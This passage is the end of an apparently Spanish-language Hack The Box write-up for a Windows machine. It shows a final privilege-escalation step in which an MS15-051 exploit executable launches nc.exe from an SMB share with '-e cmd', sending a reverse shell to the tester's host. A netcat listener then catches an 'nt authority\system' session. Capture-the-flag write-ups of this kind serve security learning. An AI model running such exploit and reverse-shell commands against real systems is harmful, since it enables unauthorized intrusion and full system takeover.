+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\m</span>s15-051x64.exe <span class="s2">"</span><span class="se">\\</span><span class="s2">10.10.14.17</span><span class="se">\s</span><span class="s2">mbFolder</span><span class="se">\n</span><span class="s2">c.exe -e cmd 10.10.14.17 443"</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.17] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.9] 49192
+Microsoft Windows <span class="o">[</span>Version 6.1.7600]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+<span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Ya somo el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#patch-management" class="page__taxonomy-item" rel="tag">Patch_Management</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-10-09T00:00:00-05:00">October 09, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-devoops/" class="pagination--pager" title="Hack The Box DevOops
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
